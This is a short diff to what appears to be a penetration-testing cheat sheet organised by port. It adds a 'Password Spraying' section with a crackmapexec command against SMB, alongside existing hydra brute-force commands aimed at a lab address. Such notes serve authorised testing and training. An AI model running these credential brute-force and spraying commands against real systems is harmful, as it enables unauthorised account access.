@@ -177,6 +177,12 @@ hydra -L users.txt -P passs.txt smb://10.0.0.1 -t 4
 hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ```
 
+#### Password Spraying
+```
+crackmapexec smb <IP> -d <DOMAIN> -u users.txt -p 'PASSWORD'
+→ EX: crackmapexec smb 10.0.0.1 -d frabricorp -u users.txt -p '123Soleil'
+```
+
 
 ## Port 143
 ## Port 389
